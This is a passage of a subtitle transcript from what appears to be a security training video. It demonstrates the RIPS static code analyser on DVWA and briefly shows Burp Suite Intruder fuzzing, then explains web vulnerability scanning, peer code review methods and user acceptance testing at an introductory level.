free-\n\n150\n00:07:02.578 --> 00:07:03.863\n&gt;&gt; [CROSSTALK] Free is good.\n\n151\n00:07:03.863 --> 00:07:08.310\n&gt;&gt; Right, allowed me to get a copy of it,\ninstall it, and\n\n152\n00:07:08.310 --> 00:07:12.678\nshow you that it's stil\nable to find vulnerability.\n\n153\n00:07:12.678 --> 00:07:15.490\nAnd here we go, nice little web\ninterface that we get here.\n\n154\n00:07:15.490 --> 00:07:20.121\nI just basically went to my web roots.\n\n155\n00:07:20.121 --> 00:07:21.925\nAnd went to [INAUDIBLE].\n\n156\n00:07:21.925 --> 00:07:26.757\nWhatever folder that you create in\nthe web directory there to access this.\n\n157\n00:07:26.757 --> 00:07:28.290\nA very simple setup.\n\n158\n00:07:28.290 --> 00:07:30.180\nI like what they got going on here.\n\n159\n00:07:30.180 --> 00:07:34.752\nYou just give it the path to the code\nthat you wanna look at or scan.\n\n160\n00:07:34.752 --> 00:07:39.008\n[COUGH] Maybe it's a directory or a\nspecific file itself, or a piece of code.\n\n161\n00:07:39.008 --> 00:07:42.763\nI'm gonna give it the path and\nlet it scan that path.\n\n162\n00:07:42.763 --> 00:07:43.960\nLet's see here.\n\n163\n00:07:43.960 --> 00:07:49.730\nMine is in VAR, VAR on a par,\nVAR/www only one.\n\n164\n00:07:49.730 --> 00:07:56.370\nAnd then it is DVWA/vulnerabilities.\n\n165\n00:07:56.370 --> 00:07:58.202\nI'm so glad they made that easy to type.\n\n166\n00:07:58.202 --> 00:08:02.664\n[LAUGH] I'm also gonna include\nthe subdirectories where they can change\n\n167\n00:08:02.664 --> 00:08:04.084\nthe verbosity level.\n\n168\n00:08:04.084 --> 00:08:06.987\nWith the different five modes\nthat they give you here.\n\n169\n00:08:06.987 --> 00:08:11.050\nAlso change the vuln type,\nwhich is quite extensive.\n\n170\n00:08:11.050 --> 00:08:13.590\nI have many, many to go with here.\n\n171\n00:08:13.590 --> 00:08:15.020\nBasically, all the oldies and goldies.\n\n172\n00:08:15.020 --> 00:08:18.660\nCode Execution, File Manipulation,\nFile Inclusion, what else have we got?\n\n173\n00:08:18.660 --> 00:08:23.220\nLDAP Injection, PHP Object Injection,\nSQL Injection, and other,\n\n174\n00:08:23.220 --> 00:08:25.885\nwhatever other is,\nI guess stuff that's hard to categorize.\n\n175\n00:08:25.885 --> 00:08:26.550\n&gt;&gt; Mm-hm.\n\n176\n00:08:26.550 --> 00:08:28.340\n&gt;&gt; You can change the code style.\n\n177\n00:08:28.340 --> 00:08:31.020\nDo top down or bottom up.\n\n178\n00:08:31.020 --> 00:08:34.760\nChange to print, or phps,\ncode dark, twilight, espresso.\n\n179\n00:08:34.760 --> 00:08:37.040\nLots of great options here.\n\n180\n00:08:37.040 --> 00:08:40.380\nAt that point though I\nam ready to do a scan.\n\n181\n00:08:40.380 --> 00:08:43.280\nSo I'm going to scroll out, hit scan.\n\n182\n00:08:43.280 --> 00:08:46.890\nSee, it's going through the thing and\nhow it has found vulnerabilities and\n\n183\n00:08:46.890 --> 00:08:48.750\nit's going to show me.\n\n184\n00:08:48.750 --> 00:08:50.740\nBreak that down,\ngive me a lovely little pie chart.\n\n185\n00:08:52.460 --> 00:08:53.460\n&gt;&gt; Nice colors too.\n\n186\n00:08:53.460 --> 00:08:54.650\n&gt;&gt; Yes.\n\n187\n00:08:54.650 --> 00:08:57.700\nWe see that found six\ncommand executions problems.\n\n188\n00:08:57.700 --> 00:09:00.250\nFive file disclosures problems.\n\n189\n00:09:00.250 --> 00:09:04.610\nOne File Inclusion, three\nFile Manipulations, four SQL Injections.\n\n190\n00:09:04.610 --> 00:09:09.350\nTwo Cross Site Scripting, and\none Possible Flow Control issue.\n\n191\n00:09:09.350 --> 00:09:12.100\n&gt;&gt; Hm.\n&gt;&gt; [COUGH] Right, lovely, lovely stuff.\n\n192\n00:09:12.100 --> 00:09:16.470\nOnce I'm ready to check out that I can\nlook through here, and it shows me\n\n193\n00:09:16.470 --> 00:09:20.720\nbasically how it was performing and\nwhere that you want to take a look at.\n\n194\n00:09:20.720 --> 00:09:22.430\nWhat file it was, so\n\n195\n00:09:22.430 --> 00:09:27.340\nthis was in low.php under this file path,\nand it was a SQL Injection.\n\n196\n00:09:27.340 --> 00:09:29.810\nUser input reaches a sensitive sync,\n\n197\n00:09:29.810 --> 00:09:33.050\nmore information press the help icon\non the left side, which is here.\n\n198\n00:09:36.500 --> 00:09:39.620\nAnd it kind of gives you\nthe SQL query throughout it and\n\n199\n00:09:39.620 --> 00:09:43.090\nwas able to elicit a SQL Injection.\n\n200\n00:09:43.090 --> 00:09:43.710\n&gt;&gt; Very cool.\n\n201\n00:09:43.710 --> 00:09:45.180\n&gt;&gt; Right?\nSo you're able to look at this and\n\n202\n00:09:45.180 --> 00:09:50.510\ngo through and figure out what the problem\nis by using automatic static analysis.\n\n203\n00:09:50.510 --> 00:09:52.045\nIt's very interesting stuff.\n\n204\n00:09:52.045 --> 00:09:53.220\n&gt;&gt; Mm-hm.\n\n205\n00:09:53.220 --> 00:09:53.890\n&gt;&gt; So play with that.\n\n206\n00:09:53.890 --> 00:09:56.170\nYou can go to the website and\ndownload that.\n\n207\n00:09:56.170 --> 00:09:57.540\nIt's called Rips.\n\n208\n00:09:57.540 --> 00:10:00.570\nIt is free, and very cool stuff.\n\n209\n00:10:00.570 --> 00:10:01.700\nIf you're doing code and\n\n210\n00:10:01.700 --> 00:10:06.730\nwanna do code analysis, it could be a very\ninteresting way to making that happen.\n\n211\n00:10:06.730 --> 00:10:07.890\n&gt;&gt; Yeah!\n&gt;&gt; All right.\n\n212\n00:10:07.890 --> 00:10:13.242\nSo now that you've seen that, I do wanna\ntell you, there are some cons too.\n\n213\n00:10:13.242 --> 00:10:14.280\n&gt;&gt; Doing automatic code analysis.\n\n214\n00:10:14.280 --> 00:10:18.670\nAnd this is a typically why you pair\nthis with manual code analysis is that,\n\n215\n00:10:18.670 --> 00:10:20.920\nthey don't find everything.\n\n216\n00:10:20.920 --> 00:10:23.690\nThey have a specific rule set, and\n\n217\n00:10:23.690 --> 00:10:27.771\nanything that falls out of the bounds\nof those rules, even though it might be\n\n218\n00:10:27.771 --> 00:10:32.040\nexploitable or a vulnerability,\nwon't get picked up by the scan.\n\n219\n00:10:32.040 --> 00:10:35.530\nSo you get false negatives,\nfalse positives, maybe you have some logic\n\n220\n00:10:35.530 --> 00:10:41.180\nthat's specific to your business that\nit's not gonna be able to figure out.\n\n221\n00:10:41.180 --> 00:10:46.758\nNow you might be able to create a custom\nscan and to pick up those outliers.\n\n222\n00:10:46.758 --> 00:10:51.113\nBut if you're not able to do that, if\nyou're not able to program that logic into\n\n223\n00:10:51.113 --> 00:10:55.533\nit, then you're back to good old manual\ncode analysis and taking a look at that,\n\n224\n00:10:55.533 --> 00:10:56.200\nall right.\n\n225\n00:10:56.200 --> 00:10:58.120\nSo, what else do they want\nus to know about that?\n\n226\n00:10:58.120 --> 00:11:01.420\nWell, I think that's about it when\nit comes to static code analysis.\n\n227\n00:11:01.420 --> 00:11:05.490\nLike I said, we're gonna talk a little\nmore about the manual process of code\n\n228\n00:11:05.490 --> 00:11:08.880\nanalysis here and\nsome of those types that we can engage in.\n\n229\n00:11:08.880 --> 00:11:12.870\nBut we're going to move into the next\nthing which is web app vulnerability scan.\n\n230\n00:11:14.710 --> 00:11:19.520\nWe have seen this, we have done this,\nbut it is a great way to check\n\n231\n00:11:19.520 --> 00:11:24.650\nyour web APIs for problems, right?\n\n232\n00:11:24.650 --> 00:11:25.480\nBecause what are they doing?\n\n233\n00:11:25.480 --> 00:11:27.270\nThey're doing vulnerability scanning.\n\n234\n00:11:27.270 --> 00:11:32.480\nThey're not necessarily looking into\nthe code of things, but they are able to\n\n235\n00:11:33.630 --> 00:11:38.580\nfind issues that we know about\nthrough the web app on the user's end.\n\n236\n00:11:38.580 --> 00:11:41.010\nSo this is more of like\na black box type of device.\n\n237\n00:11:41.010 --> 00:11:44.990\nOkay, so we're on the outside looking in,\ninstead of from the inside looking in.\n\n238\n00:11:44.990 --> 00:11:46.690\nThat makes sense.\n\n239\n00:11:46.690 --> 00:11:49.410\nSo they'll be looking for\ncommon web application vulnerabilities,\n\n240\n00:11:49.410 --> 00:11:53.320\nwhich includes SQL Injection and\nCross Site Scripting, Code Injection,\n\n241\n00:11:54.970 --> 00:11:58.650\nLFIs, RFIs, which are local file\nincludes and remote file includes.\n\n242\n00:11:58.650 --> 00:12:03.210\nDirectors reversals and\ndata leakage, etcetera.\n\n243\n00:12:03.210 --> 00:12:04.730\nYes, as they go.\n\n244\n00:12:04.730 --> 00:12:10.346\nSo definitely use web app vulnerability\nscanners in your system [INAUDIBLE] for\n\n245\n00:12:10.346 --> 00:12:11.813\nsecurity, right?\n\n246\n00:12:11.813 --> 00:12:15.255\nAnd probably gonna be using\nan interception proxy along with this,\n\n247\n00:12:15.255 --> 00:12:19.020\ncuz a lot of interception proxies\nalso have vulnerability scanners.\n\n248\n00:12:19.020 --> 00:12:20.620\nThey kinda walk hand-in-hand\na lot of the times.\n\n249\n00:12:20.620 --> 00:12:21.480\nBurp Suite, hello?\n\n250\n00:12:21.480 --> 00:12:22.030\nBurp Suite?\n\n251\n00:12:22.030 --> 00:12:22.850\nAnybody, right?\n\n252\n00:12:22.850 --> 00:12:24.970\n&gt;&gt; Yeah.\n&gt;&gt; The de facto standard of\n\n253\n00:12:26.070 --> 00:12:27.200\nvulnerability scan,\n\n254\n00:12:27.200 --> 00:12:31.690\nmaybe not vulnerability scanners, it has a\ngreat vulnerability scanner built into it.\n\n255\n00:12:31.690 --> 00:12:35.600\nIf you have the pay for version, you get\nthe vulnerability scanner capabilities and\n\n256\n00:12:35.600 --> 00:12:37.400\nit does a fantastic job with that.\n\n257\n00:12:37.400 --> 00:12:42.338\nBut it's all wrapped around that wonderful\ninterception proxy that's built in\n\n258\n00:12:42.338 --> 00:12:45.980\nthe Burp Suite,\nwhich we've seen on a multitude of times.\n\n259\n00:12:45.980 --> 00:12:48.030\n&gt;&gt; Mm-hm.\n&gt;&gt; So I won't bore you with that.\n\n260\n00:12:48.030 --> 00:12:51.690\nJust remember there's other automated\ntools such as a Kinetics NIC2.\n\n261\n00:12:51.690 --> 00:12:53.380\nAgain, we’ve seen NIC2.\n\n262\n00:12:53.380 --> 00:12:57.971\nWe haven’t seen Akinetics NIC2 because\nI’m not going through the free trial sign\n\n263\n00:12:57.971 --> 00:12:59.320\nup thing.\n\n264\n00:12:59.320 --> 00:13:03.510\nFeel free though for yourself,\nto go out there fill out the form.\n\n265\n00:13:03.510 --> 00:13:04.940\nGet contacted by a sales person.\n\n266\n00:13:06.270 --> 00:13:08.680\nAnd get your free trial if\nyou want to play around.\n\n267\n00:13:08.680 --> 00:13:09.693\nGet some experience.\n\n268\n00:13:09.693 --> 00:13:15.049\nIf you want that experience with it, it’s\nworth filling out the form and getting on\n\n269\n00:13:15.049 --> 00:13:19.960\na mailing list and having to unsubscribe\nto get a hold of a free trial of that.\n\n270\n00:13:19.960 --> 00:13:22.110\nSo, I would suggest it.\n\n271\n00:13:22.110 --> 00:13:26.550\n[COUGH] All right, manual testing,\nwe've talked about that,\n\n272\n00:13:26.550 --> 00:13:29.160\ncan also be done from the outside in.\n\n273\n00:13:29.160 --> 00:13:33.508\nDoing the same thing that your\nvulnerability scans would do.\n\n274\n00:13:33.508 --> 00:13:34.870\nYou're just kinda doing it yourself.\n\n275\n00:13:35.940 --> 00:13:38.628\nI know a few SQL Injection strings, and\n\n276\n00:13:38.628 --> 00:13:43.438\nwe go to this log-in form and\nsee if it's vulnerable to maintenance,\n\n277\n00:13:43.438 --> 00:13:48.230\nwhereas something like SQL Map\nwould do it automatically for you.\n\n278\n00:13:48.230 --> 00:13:52.880\nAgain, the same reasons apply,\nas the aesthetic code analysis.\n\n279\n00:13:52.880 --> 00:13:54.610\nScanners don't catch them.\n\n280\n00:13:54.610 --> 00:13:58.480\nThey do a good job, but\nthey don't catch everything.\n\n281\n00:13:58.480 --> 00:14:03.820\nOr I was reading an article from actually,\n\n282\n00:14:03.820 --> 00:14:10.250\nI took his class, and he was a bright man,\nand develops a lot of cool security tools.\n\n283\n00:14:10.250 --> 00:14:13.950\nAnd he developed this tool for\nlooking for SQL Injection.\n\n284\n00:14:13.950 --> 00:14:16.050\nI can't remember the name of\nit off the top of my head.\n\n285\n00:14:16.050 --> 00:14:18.030\nI was reading just recently,\nthey come out with this.\n\n286\n00:14:18.030 --> 00:14:22.390\nAnd he said raise your hand\nif you use SQL Map, and\n\n287\n00:14:22.390 --> 00:14:25.490\nit didn't find a SQL injection\nthat you knew was there.\n\n288\n00:14:25.490 --> 00:14:28.790\nAnd he goes, now everybody,\nput your hands down.\n\n289\n00:14:28.790 --> 00:14:30.683\nBecause it's true, I've used SQL Map and\n\n290\n00:14:30.683 --> 00:14:34.216\nI'm like I know this is open to this\nSQL Injection, but SQL Map didn't find it.\n\n291\n00:14:34.216 --> 00:14:34.807\n&gt;&gt; Mm-hm.\n\n292\n00:14:34.807 --> 00:14:37.172\n&gt;&gt; Cuz I didn't tune it right, and\ndo the right thing, all right.\n\n293\n00:14:37.172 --> 00:14:40.608\nSo it can become mitigate that.\n\n294\n00:14:40.608 --> 00:14:42.470\n&gt;&gt; Cool.\n&gt;&gt; Anyway, I digress.\n\n295\n00:14:42.470 --> 00:14:44.790\nFuzzing, let's talk about fuzzing.\n\n296\n00:14:44.790 --> 00:14:45.690\n&gt;&gt; Fuzzing.\n\n297\n00:14:45.690 --> 00:14:49.050\n&gt;&gt; I know, he loves to fuzz, interesting.\n\n298\n00:14:49.050 --> 00:14:53.520\nIt is fun to fuzz, get in there and\nbasically try to throw some\n\n299\n00:14:53.520 --> 00:14:58.280\nknown strings at things to see it\nyou can elicit a weird response or\n\n300\n00:14:58.280 --> 00:15:00.570\nmaybe crash the program or something.\n\n301\n00:15:00.570 --> 00:15:05.300\nTry to get it to do something\nthat you don't expect it to do.\n\n302\n00:15:05.300 --> 00:15:07.310\nThat's what you're trying\nto do with fuzzing.\n\n303\n00:15:07.310 --> 00:15:11.702\nAnd you can play around with that, I can\nactually probably bring up Burp Suite and\n\n304\n00:15:11.702 --> 00:15:14.620\nshow you quick,\nlet me see if I can't do that for you.\n\n305\n00:15:14.620 --> 00:15:18.045\nLet me get rips out of the way, rips,\nI can leave you there it's fine.\n\n306\n00:15:18.045 --> 00:15:19.906\nI'll just bring up Burp.\n\n307\n00:15:19.906 --> 00:15:22.805\nLittle Burp fire away.\n\n308\n00:15:22.805 --> 00:15:26.470\nAnd what we can do is\nwrite up this new project.\n\n309\n00:15:26.470 --> 00:15:27.160\nLet's start Burp.\n\n310\n00:15:28.480 --> 00:15:29.400\nGo in here.\n\n311\n00:15:29.400 --> 00:15:32.663\nGet this thing to.\n\n312\n00:15:32.663 --> 00:15:33.622\nBurp get down.\n\n313\n00:15:33.622 --> 00:15:35.006\nThank you.\n\n314\n00:15:35.006 --> 00:15:40.170\nGet to change my preferences so\nthat I go through the proxy&gt;Settings.\n\n315\n00:15:40.170 --> 00:15:42.760\nYou know proxy configuration\nport 8080 all looks good.\n\n316\n00:15:42.760 --> 00:15:43.370\nHit OK.\n\n317\n00:15:43.370 --> 00:15:46.850\nSo now we'll be working through that.\n\n318\n00:15:46.850 --> 00:15:50.674\nAnd then with Burp.\n\n319\n00:15:50.674 --> 00:15:52.249\nI always do that.\n\n320\n00:15:52.249 --> 00:15:53.573\nCuz the icons are the same.\n\n321\n00:15:53.573 --> 00:15:54.571\nSo there's my open Burp.\n\n322\n00:15:54.571 --> 00:15:57.206\nNo, I want to leave.\n\n323\n00:15:57.206 --> 00:15:58.457\nI want to cancel.\n\n324\n00:15:58.457 --> 00:16:02.889\n&gt;&gt; If someone was hearing this and\nthey no idea what BurpSuite was, and\n\n325\n00:16:02.889 --> 00:16:07.781\nyou said, I have an open Burp now,\nI need to close Burp, I need a Burp icon,\n\n326\n00:16:07.781 --> 00:16:09.860\nthey'd probably-\n&gt;&gt; Yeah.\n\n327\n00:16:09.860 --> 00:16:12.870\n&gt;&gt; So the little icon over\nhere right here is the open\n\n328\n00:16:12.870 --> 00:16:17.190\nlike we have actually started Burp and\nhere is the shortcut to launch Burp.\n\n329\n00:16:17.190 --> 00:16:19.090\nAnd I'm still used to just launching Burp.\n\n330\n00:16:19.090 --> 00:16:19.830\n&gt;&gt; Launch that Burp.\n\n331\n00:16:19.830 --> 00:16:22.390\n&gt;&gt; Yeah, and so that was my bad.\n\n332\n00:16:22.390 --> 00:16:23.910\nSo now we've got Burp opening.\n\n333\n00:16:25.640 --> 00:16:27.980\nWe can come in here and\nwe can use things like the intruder,\n\n334\n00:16:27.980 --> 00:16:30.590\nwhich gives you like positions.\n\n335\n00:16:30.590 --> 00:16:32.550\nI could come in here and\nchange this position.\n\n336\n00:16:32.550 --> 00:16:34.200\nSo I can clear this out.\n\n337\n00:16:34.200 --> 00:16:39.650\nAnd if I wanna change this position\nto be a regular expression,\n\n338\n00:16:39.650 --> 00:16:44.310\nlet me pull in a little tighter\non that there, there we go.\n\n339\n00:16:44.310 --> 00:16:47.220\nSo this is some post that I'm\ntrying to post to this website.\n\n340\n00:16:47.220 --> 00:16:49.460\nIf I wanted to change\nthis specific position,\n\n341\n00:16:49.460 --> 00:16:53.340\nsomething that's being posted to the page,\nI can change that.\n\n342\n00:16:53.340 --> 00:16:59.850\nI can come in and say, okay, that's\nwhere I want I'm gonna add my markers.\n\n343\n00:16:59.850 --> 00:17:01.630\nSo now you'll see it's got these\nlittle markers around it, so\n\n344\n00:17:01.630 --> 00:17:06.220\nit knows that's where I wanna iterate\nthrough certain amount of characters.\n\n345\n00:17:06.220 --> 00:17:12.650\nAnd I can go to Payloads and just do\na simple list or load up a from a file.\n\n346\n00:17:12.650 --> 00:17:14.490\nIf I have a pay version\nI think it needs to,\n\n347\n00:17:14.490 --> 00:17:17.950\nyeah, add from this from\nthe pro only version.\n\n348\n00:17:17.950 --> 00:17:22.500\nSo just keep aware you can just copy and\npaste these into here make a simple list.\n\n349\n00:17:22.500 --> 00:17:28.256\nAnd say instead of,\nwhat was the position pl val,\n\n350\n00:17:28.256 --> 00:17:31.280\nmake it, JL val, KL val.\n\n351\n00:17:31.280 --> 00:17:34.210\nInstead of having to do that manually,\nI can do that here.\n\n352\n00:17:34.210 --> 00:17:35.240\nAnd that's fuzzing.\n\n353\n00:17:35.240 --> 00:17:38.780\nMake it a bunch of A's,\nmake it a bunch of B's, make it whatever,\n\n354\n00:17:38.780 --> 00:17:40.210\nsomething interesting.\n\n355\n00:17:40.210 --> 00:17:46.460\nMaybe I'm trying to fuzz a SQL injection,\nI can make a list of known SQL injections.\n\n356\n00:17:46.460 --> 00:17:50.434\nAnd if that's like a log in form or\nsomething,\n\n357\n00:17:50.434 --> 00:17:54.150\na URL, that would be\nsusceptible to SQL injection.\n\n358\n00:17:54.150 --> 00:17:57.900\nI can fuzz that list by just\nadding here using Burp to do this.\n\n359\n00:17:57.900 --> 00:18:00.270\nSo It's kind of cool that\nyou're able to do that.\n\n360\n00:18:00.270 --> 00:18:00.960\n&gt;&gt; Yeah.\n&gt;&gt; All right.\n\n361\n00:18:00.960 --> 00:18:01.840\nCool stuff.\n\n362\n00:18:01.840 --> 00:18:04.020\nJust giving you an idea\nof what that looks like.\n\n363\n00:18:04.020 --> 00:18:05.419\nLet me close Burp.\n\n364\n00:18:05.419 --> 00:18:06.720\nYes, I want to close Burp.\n\n365\n00:18:06.720 --> 00:18:08.610\nAll right, moving on.\n\n366\n00:18:08.610 --> 00:18:09.600\nWe've talked about fuzzing.\n\n367\n00:18:09.600 --> 00:18:13.560\nNow let's get into that manual\npeer review stuff, right?\n\n368\n00:18:13.560 --> 00:18:18.620\nSo I did notice I tacked on\nthe word peer review, right?\n\n369\n00:18:18.620 --> 00:18:21.220\nSo if you're doing a manual code review,\nthat's you.\n\n370\n00:18:21.220 --> 00:18:23.910\nI am doing the code review.\n\n371\n00:18:23.910 --> 00:18:27.978\nIf I'm doing a manual peer\nreview that means Zach and\n\n372\n00:18:27.978 --> 00:18:33.155\nI are both developers and in some\nway I'm gonna bring Zach in to help\n\n373\n00:18:33.155 --> 00:18:38.257\nme look at my code to make sure\nthat everything looks good, okay?\n\n374\n00:18:38.257 --> 00:18:42.235\nThere's a couple of ways they call out for\nthe [INAUDIBLE] exam,\n\n375\n00:18:42.235 --> 00:18:45.311\nhow you wanna do this\nwhich is pair programming,\n\n376\n00:18:45.311 --> 00:18:48.932\nover the shoulder programming,\nor pass around review.\n\n377\n00:18:48.932 --> 00:18:50.400\nInteresting techniques, all of them.\n\n378\n00:18:50.400 --> 00:18:53.800\nYou might wanna employ one,\nsome, or all, it's up to you.\n\n379\n00:18:53.800 --> 00:18:56.040\nDepends on your pocketbook\nmost of the time,\n\n380\n00:18:56.040 --> 00:18:57.460\nlike when it comes to pair programming.\n\n381\n00:18:57.460 --> 00:18:59.815\nNow we do pair programming\nhere at ITPro.TV.\n\n382\n00:18:59.815 --> 00:19:01.569\nOur developers, they work in pairs.\n\n383\n00:19:01.569 --> 00:19:02.340\n&gt;&gt; Yes, that's right.\n\n384\n00:19:02.340 --> 00:19:05.360\n&gt;&gt; And what they do is,\nthe way this works, is, if Zach and\n\n385\n00:19:05.360 --> 00:19:06.750\nI are working together.\n\n386\n00:19:06.750 --> 00:19:11.475\nMaybe today I'm the one that's actually\nbehind the, I'm the keyboard jock, and\n\n387\n00:19:11.475 --> 00:19:15.340\nZach is looking at a screen, and he's\nseeing everything that I type, everything\n\n388\n00:19:15.340 --> 00:19:19.350\nthat I'm doing, and we're discussing\nwhat I'm putting in while I'm doing it.\n\n389\n00:19:19.350 --> 00:19:22.790\nAnd he's giving me insights and\ninput based on his experience and\n\n390\n00:19:22.790 --> 00:19:25.800\nhis abilities and vice-versa.\n\n391\n00:19:25.800 --> 00:19:27.990\nAnd maybe I'm coding something,\nI'm like, yeah,\n\n392\n00:19:27.990 --> 00:19:31.780\nwe know what we need to add an ability\nto go to this area, but you know what,\n\n393\n00:19:31.780 --> 00:19:34.630\nthat's walled off so\nwe gonna get past that.\n\n394\n00:19:34.630 --> 00:19:36.730\nWe will just put some\ncredentials in there and\n\n395\n00:19:36.730 --> 00:19:41.850\nhe goes, well, hold on, it's not really\nsecure coding best practices, right?\n\n396\n00:19:41.850 --> 00:19:45.060\nAnd I go, yeah, but\nwe'll just make it work.\n\n397\n00:19:45.060 --> 00:19:46.920\nHe goes,\nI get where you're going with this,\n\n398\n00:19:46.920 --> 00:19:51.510\nbut it's probably not a good idea, right?\n\n399\n00:19:51.510 --> 00:19:54.748\nSo I've got him checking me,\nkeeping me in check and\n\n400\n00:19:54.748 --> 00:19:58.585\nwhen he's the keyboard jockey,\nI'm doing the same for him.\n\n401\n00:19:58.585 --> 00:20:02.705\nNow, I say that can be expensive\nbecause basically you're getting two\n\n402\n00:20:02.705 --> 00:20:04.910\nprogrammers doing one piece of work.\n\n403\n00:20:04.910 --> 00:20:06.151\nTrue story, [LAUGH].\n\n404\n00:20:06.151 --> 00:20:09.976\nInstead of one person doing all\nthe work and having it reviewed, so\n\n405\n00:20:09.976 --> 00:20:12.110\nit can cost a little bit money there.\n\n406\n00:20:14.970 --> 00:20:21.720\nOver the shoulder is also a common way\nto do this, which is I program, I get in\n\n407\n00:20:21.720 --> 00:20:27.110\nthere, and I hammer away some codes, and\nthen I go, hey, Zach, come check it out.\n\n408\n00:20:27.110 --> 00:20:29.800\nAnd he kinda comes over, and\nI walk him through the logic of it.\n\n409\n00:20:29.800 --> 00:20:32.480\nAnd he looks at it, he goes, yeah,\nthat's interesting, I like that.\n\n410\n00:20:32.480 --> 00:20:34.950\nHey, did you think about maybe,\nI've seen this before.\n\n411\n00:20:34.950 --> 00:20:36.802\nThere's a more efficient way to do that.\n\n412\n00:20:36.802 --> 00:20:41.292\nSo very similar to pair programming,\nexcept they're not working together per\n\n413\n00:20:41.292 --> 00:20:46.185\nse, it's just at certain points sometimes\nZach will come by, another developer will\n\n414\n00:20:46.185 --> 00:20:50.720\ncome by and take a look at that code and\noffer their opinions and experiments.\n\n415\n00:20:50.720 --> 00:20:52.070\n&gt;&gt; Like proofreaders or editors.\n\n416\n00:20:52.070 --> 00:20:52.630\n&gt;&gt; Yes.\n\n417\n00:20:52.630 --> 00:20:53.130\n&gt;&gt; That's exactly.\n\n418\n00:20:53.130 --> 00:20:55.240\n&gt;&gt; Yeah, it's a very good way to put it.\n\n419\n00:20:55.240 --> 00:20:56.280\n&gt;&gt; Yeah.\n&gt;&gt; Ideal actually.\n\n420\n00:20:56.280 --> 00:20:57.320\nThat's exactly what they're doing.\n\n421\n00:20:57.320 --> 00:21:00.830\nThey're making sure, hey,\nyou missed a semi colon there.\n\n422\n00:21:00.830 --> 00:21:03.020\n[LAUGH] That's why it's not compiling.\n\n423\n00:21:03.020 --> 00:21:04.620\nAnd of course,\nyou've been staring at it for two hours.\n\n424\n00:21:04.620 --> 00:21:06.600\n&gt;&gt; Well,\nyou missed an I in vulnerability, yeah.\n\n425\n00:21:06.600 --> 00:21:09.381\n&gt;&gt; It's quite possible that could happen.\n\n426\n00:21:09.381 --> 00:21:10.890\nShut up.\n\n427\n00:21:10.890 --> 00:21:15.710\n[LAUGH] Inside joke right over there.\n\n428\n00:21:15.710 --> 00:21:18.060\nLet's move onto pass around programing.\n\n429\n00:21:18.060 --> 00:21:22.540\nWhich is kind of similar to\nover the shoulder programming,\n\n430\n00:21:22.540 --> 00:21:26.190\nin the way that I'm getting other\nprograms to look at it, but\n\n431\n00:21:26.190 --> 00:21:31.110\nnot working with me per se in the heat\nof the moment, as it were, right?\n\n432\n00:21:31.110 --> 00:21:34.330\nBut instead of coming and\nstanding over my actual shoulder,\n\n433\n00:21:34.330 --> 00:21:36.610\nI email them a copy of the code,\nhey, check the code out.\n\n434\n00:21:36.610 --> 00:21:39.430\nAnd it passes around from\ndeveloper to developer and\n\n435\n00:21:39.430 --> 00:21:41.220\na few people get involved and\nthey check it out.\n\n436\n00:21:41.220 --> 00:21:45.920\nBy the time it gets back to the original\nperson, maybe some notes are coming along\n\n437\n00:21:45.920 --> 00:21:51.290\nwith that going, hey, I saw some ways in\nwhich you can improve security on this,\n\n438\n00:21:51.290 --> 00:21:54.470\nmight wanna try these different methods.\n\n439\n00:21:54.470 --> 00:21:55.780\nI didn't change your code, but\n\n440\n00:21:55.780 --> 00:22:00.140\nhere there's some suggestions I\nwould make if it were mine, and\n\n441\n00:22:00.140 --> 00:22:04.520\nthen I could take that into account,\nmaybe make some changes in the code.\n\n442\n00:22:04.520 --> 00:22:06.760\nSo there's the different\ntypes that they have.\n\n443\n00:22:06.760 --> 00:22:09.500\nThey also have user acceptance testing.\n\n444\n00:22:09.500 --> 00:22:12.950\nThis isn't a manual peer review.\n\n445\n00:22:12.950 --> 00:22:14.410\nWe've kind of moved on.\n\n446\n00:22:14.410 --> 00:22:17.560\nI've got an actual product,\na viable product in hand.\n\n447\n00:22:17.560 --> 00:22:19.405\nI can deliver it.\n\n448\n00:22:19.405 --> 00:22:24.470\nBut nothing is perfect out the gate.\n\n449\n00:22:24.470 --> 00:22:26.170\nAnd I'm sure, Zach,\nthat you've dealt with this.\n\n450\n00:22:26.170 --> 00:22:28.260\nHave you ever used a Microsoft product?\n\n451\n00:22:28.260 --> 00:22:31.290\n&gt;&gt; Sure.\n&gt;&gt; Well, then, okay, you have done UAT.\n\n452\n00:22:31.290 --> 00:22:32.489\nGood for you.\n\n453\n00:22:32.489 --> 00:22:34.490\nThe User Acceptance Testing.\n\n454\n00:22:34.490 --> 00:22:35.890\nBasically, beta testing.\n\n455\n00:22:35.890 --> 00:22:36.580\n&gt;&gt; Right.\n\n456\n00:22:36.580 --> 00:22:37.570\n&gt;&gt; Well, I say that.\n\n457\n00:22:37.570 --> 00:22:41.970\nI'm making fun of Microsoft, because\nthey like to just rush things to market.\n\n458\n00:22:41.970 --> 00:22:44.760\nYou guys don't like that feature,\nwe'll change it in the next Service Pack.\n\n459\n00:22:44.760 --> 00:22:46.020\n&gt;&gt; You mean, like Vista.\n\n460\n00:22:46.020 --> 00:22:46.990\n&gt;&gt; Yeah, so.\n\n461\n00:22:46.990 --> 00:22:48.670\n&gt;&gt; Only kidding, it was a great product.\n\n462\n00:22:48.670 --> 00:22:53.818\n&gt;&gt; We love Microsoft products, but they\ntend to get their users to test it for\n\n463\n00:22:53.818 --> 00:22:56.240\nthem after they've released it.\n\n464\n00:22:56.240 --> 00:22:59.530\nBut beta programs, specifically\nwhat we're talking about here.\n\n465\n00:22:59.530 --> 00:23:03.130\nI have a core set of users\n\n466\n00:23:03.130 --> 00:23:08.030\nthat I'm going to send them\nearly renditions of my products.\n\n467\n00:23:08.030 --> 00:23:12.612\nLet them test drive it, let them run it\ndown the street a few times and go, man,\n\n468\n00:23:12.612 --> 00:23:15.600\nI really like the product,\ndon't like this, or,\n\n469\n00:23:15.600 --> 00:23:20.050\nit did something weird when I clicked\non that and had this down I noticed.\n\n470\n00:23:20.050 --> 00:23:22.120\nI didn't know that it did, thanks for.\n\n471\n00:23:22.120 --> 00:23:26.500\nSo they're gonna actually engage in the\nusing of the product to find the flaws or\n\n472\n00:23:26.500 --> 00:23:27.600\nthe bugs.\n\n473\n00:23:27.600 --> 00:23:30.780\nAnd maybe even find some security\nissues along the way as well.\n\n474\n00:23:30.780 --> 00:23:31.910\nSo we can go back and fix it.\n\n475\n00:23:31.910 --> 00:23:36.400\nAnd, did you know I was able to access\nthat area, even though I wasn't an admin?\n\n476\n00:23:36.400 --> 00:23:38.372\nAs long as i did this, this, and this.\n\n477\n00:23:38.372 --> 